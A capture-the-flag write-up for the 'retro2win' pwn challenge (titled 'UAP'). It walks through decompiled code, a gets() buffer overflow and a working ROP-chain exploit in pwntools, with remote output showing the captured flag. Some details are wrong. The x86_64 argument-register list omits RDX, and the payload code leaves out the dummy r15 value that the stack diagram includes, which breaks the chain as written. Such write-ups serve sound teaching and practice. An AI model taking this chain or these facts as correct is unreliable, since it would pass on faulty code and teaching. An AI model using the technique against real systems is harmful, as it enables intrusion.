# 1337UP 2024 - UAP

```bash
[*] '/home/ubuntu/pat/pwn-writeups/1337UP-2024/retro/retro2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### Reverse Engineer Source

These were obtained with Ghidra after removing irrelevant bits and renaming/retyping.

```c
undefined8 main(void)
{
  int choice;
  
  do {
    while( true ) {
      while( true ) {
        show_main_menu();
        __isoc99_scanf(&DAT_00400c19,&choice);
        getchar();
        if (choice != 2) break;
        battle_dragon();
      }
      if (2 < choice) break;
      if (choice == 1) {
        explore_forest();
      }
      else {
LAB_0040093b:
        puts("Invalid choice! Please select a valid option.");
      }
    }
    if (choice == 3) {
      puts("Quitting game...");
      return 0;
    }
    if (choice != 0x539) goto LAB_0040093b;
    enter_cheatcode();        <-------------
  } while( true );
}
```

```c
void enter_cheatcode(void)

{
  char local_18 [16];
  
  puts("Enter your cheatcode:");
  gets(local_18);
  printf("Checking cheatcode: %s!\n",local_18);
  return;
}
```

```c
void cheat_mode(long param_1,long param_2)

{
  char *pcVar1;
  char local_58 [72];
  FILE *local_10;
  
  if ((param_1 == 0x2323232323232323) && (param_2 == 0x4242424242424242)) {
    puts("CHEAT MODE ACTIVATED!");
    puts("You now have access to secret developer tools...\n");
    local_10 = fopen("flag.txt","r");
    if (local_10 == (FILE *)0x0) {
      puts("Error: Could not open flag.txt");
    }
    else {
      pcVar1 = fgets(local_58,0x40,local_10);
      if (pcVar1 != (char *)0x0) {
        printf("FLAG: %s\n",local_58);
      }
      fclose(local_10);
    }
  }
  else {
    puts("Unauthorized access detected! Returning to main menu...\n");
  }
  return;
}
```

### Where to begin

Once you reverse, the exploit is pretty obvious. We need to reach enter_cheatcode() which has a buffer overflow, and land into cheat_mode() and access the flag. 

### Setup

To enter_cheatcode(), we have to select option 0x539 or 1337. This isn't given to us in the menu but reversing shows us this hidden path. Since there's no stack canary, it makes sense that our exploit is to take advantage of stack buffer overflow by overwriting instruction pointer to cheat_mode(). Now, the difficult part is that cheat_mode() will only show the flag if it satisfies this condition on it's inputted parameters:

```c
if ((param_1 == 0x2323232323232323) && (param_2 == 0x4242424242424242)) {
    puts("CHEAT MODE ACTIVATED!");
    puts("You now have access to secret developer tools...\n");
    local_10 = fopen("flag.txt","r");
    ...
}
else {
  puts("Unauthorized access detected! Returning to main menu...\n");
}
```

We need to somehow "call" with these params: cheat_mode(0x2323232323232323, 0x4242424242424242) 

Before understanding this exploit, you should have a good understanding of x86_64 calling conventions (which are different to that of x86 / i386). As a high level overview: whenever you call a function, your first 6 arguments are passed in the registers RDI, RSI, RCX, R8, R9, respectively. The remaining arguments are passed onto the stack. So, we want to setup RDI = 0x2323232323232323 and RSI = 0x4242424242424242 before we enter cheat_mode().

To do this, we'll utilize an ROP chain. This is useful when you can overwrite saved instruction pointer but cannot directly execute arbitrary code. Use whatever tool to extract gadgets from your binary (I use ROPgadget) and I reccommend saving it to a file so you can reference it without having to rerun the gadget finder. 

Our target gadgets would be a pop rdi and pop rsi. These are popular gadgets to use when you want to write over a register to a desired value. Thankfully, pop instructions are widely available.

```bash
$ ROPgadget --binary retro2win > gadgets
$ cat gadgets | rg -E 'pop rdi|pop rsi'
0x00000000004009b3 : pop rdi ; ret
0x00000000004009b1 : pop rsi ; pop r15 ; ret
```

Perfect! Let's get to our exploit.

### Exploit

Let's start with entering cheat mode.

```python
r = process('./retro2win')
r.sendlineafter(b'Select an option:', b'1337')
```

Now that we're in enter_cheatcode(), we need to send in the payload. First, we need to reach the saved instruction pointer. As you can see in the source code of enter_cheatcode(), the size of the buffer is 16 bytes. After the buffer is the saved base pointer, then the saved instruction pointer.
```
pay = b'A' * 16   # fill in buffer
pay += b'B' * 8   # overwrite saved rbp
```

Now, let's setup our ROP chain in this order:
1. Set RDI = 0x2323232323232323
2. Set RSI = 0x4242424242424242
3. Return to cheat_mode()

Here's what that looks like:
```python
pop_rdi = 0x4009b3
pop_rsi_r15 = 0x4009b1
cheat_mode = 0x400736

pay = b'A' * 16   # fill in buffer
pay += b'B' * 8   # overwrite saved rbp
pay += p64(pop_rdi) + p64(0x2323232323232323)
pay += p64(pop_rsi_r15) + p64(0x4242424242424242)
pay += p64(cheat_mode)

r.sendline(pay)

Stack
+---------------+       +---------------+ 
|  ........     | ----> |  AAAAAAAA     |
|---------------|       |---------------|
|  saved rbp    |       |  BBBBBBBB     |
|---------------|       |---------------|
|  saved rip    |       |  pop_rdi      |
|---------------|       |---------------|
|               |       |  0x2323.....  |
|---------------|       |---------------|
|               |       |  pop_rsi_r15  |
|---------------|       |---------------|
|               |       |  0x4242.....  |
|---------------|       |---------------|
|               |       |  dummy_value  |
|---------------|       |---------------|
|               |       |  cheat_mode   |
|               |       |               |
+---------------+       +---------------+
```

Note, the only available pop rsi gadget also pops r15 after it. This is harmless since the value in r15 isn't relevant in calling cheat_mode(). We'll just put any value in it.

When we exit enter_cheatcode() it "returns" to pop rdi then pop rsi then cheat_mode(). Now we can pass the if statement condition and access the flag :).

```bash
➜  retro git:(main) ✗ python solve.py
[*] '/home/ubuntu/pat/pwn-writeups/1337UP-2024/retro/retro2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to retro2win.ctf.intigriti.io on port 1338: Done
[*] Switching to interactive mode

Checking cheatcode: AAAAAAAAAAAAAAAAAAAAAAAA\xb3        @!
CHEAT MODE ACTIVATED!
You now have access to secret developer tools...

FLAG: INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}
```
